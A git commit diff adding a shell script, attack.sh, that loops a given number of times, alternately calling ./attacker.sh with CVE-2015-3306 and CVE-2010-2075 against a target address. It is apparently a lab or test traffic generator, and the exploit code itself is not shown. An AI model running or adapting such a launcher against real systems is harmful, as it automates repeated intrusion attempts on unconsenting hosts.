0b1cb25b1448d8c04a56b84033468bc86e81ce54
root <root@localhost.localdomain>
2020-04-26 02:12:07 +0000

    finished attack script

--- attack.sh
+++ attack.sh
@@ -1,1 +1,20 @@
-./attacker.sh
+TARGET=$1
+SOURCE=$2
+NUM=$3
+
+COUNT=0
+VAL=0
+while [ $COUNT -lt $NUM ]
+do
+	if [ $VAL -eq 0 ]
+	then 
+		./attacker.sh CVE-2015-3306 $TARGET $SOURCE
+		VAL=1
+	elif [ $VAL -eq 1 ]
+	then
+		./attacker.sh CVE-2010-2075 $TARGET $SOURCE
+		VAL=0
+	fi
+	COUNT=$(($COUNT + 1))
+done
+
